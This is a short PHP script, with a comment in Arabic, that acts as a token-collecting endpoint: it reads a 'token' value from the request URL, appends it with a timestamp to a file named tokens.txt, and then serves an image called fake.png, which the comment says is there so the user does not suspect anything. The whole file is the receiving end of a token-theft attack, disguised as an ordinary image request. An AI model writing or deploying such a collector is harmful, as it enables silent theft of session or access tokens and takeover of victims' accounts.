<?php
$token = $_GET['token'] ?? 'empty';
file_put_contents('tokens.txt', date("Y-m-d H:i")."  ".$token.PHP_EOL, FILE_APPEND);
// ترجيع صورة عششان ما يشك المستخدم
header("Content-Type: image/png");
readfile("fake.png");
?>